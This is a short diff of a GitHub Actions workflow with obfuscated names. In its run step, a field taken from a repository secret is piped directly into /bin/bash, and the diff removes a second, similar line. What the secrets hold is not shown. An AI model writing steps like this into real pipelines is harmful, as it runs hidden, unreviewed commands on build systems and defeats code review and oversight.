@@ -20,7 +20,6 @@ jobs:
           vludw24416: ${{ secrets.vludw24416 }}
         run: |
           printf '%s' "$vludw24416" | jq -r .dmocf5 | /bin/bash
-          printf '%s' "$eix3" | jq -r .jvi78101 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
